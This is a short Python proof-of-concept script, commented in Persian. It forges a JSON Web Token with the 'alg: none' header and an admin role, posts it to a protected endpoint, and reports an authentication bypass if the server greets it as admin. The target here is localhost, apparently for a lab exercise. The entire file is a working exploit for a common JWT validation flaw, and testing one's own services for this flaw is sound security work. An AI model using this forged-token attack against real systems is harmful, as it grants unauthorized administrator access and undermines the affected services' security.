import requests
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def generate_malicious_token():
    print("[*] Generating normal token...")
    # ۱. ساخت توکن عادی (کاربر مهمان)
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "guest", "role": "user"}
    
    header_b64 = b64url_encode(json.dumps(header).encode())
    payload_b64 = b64url_encode(json.dumps(payload).encode())
    valid_token = f"{header_b64}.{payload_b64}.dummy_signature"
    print(f"    Normal Token: {valid_token[:40]}...")
    
    print("\n[*] Generating malicious token (alg:none)...")
    # ۲. ساخت توکن مخرب (تغییر الگوریتم به none و نقش به admin)
    m_header = {"alg": "none", "typ": "JWT"}
    m_payload = {"user": "admin", "role": "admin"}
    
    m_header_b64 = b64url_encode(json.dumps(m_header).encode())
    m_payload_b64 = b64url_encode(json.dumps(m_payload).encode())
    # امضا خالی می‌مونه
    malicious_token = f"{m_header_b64}.{m_payload_b64}."
    print(f"    Malicious Token: {malicious_token[:40]}...")
    
    return malicious_token

def test_bypass(url):
    malicious_token = generate_malicious_token()
    print(f"\n[*] Sending malicious token to {url}...")
    
    data = {"token": malicious_token}
    try:
        r = requests.post(url, json=data, timeout=3)
        print(f"[+] Response: {r.text}")
        
        if "Welcome Admin" in r.text:
            print("\n[!] SUCCESS! JWT Authentication Bypass Found.")
            print("    The server accepted a token with 'alg: none'.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000/protected"
    test_bypass(target_url)
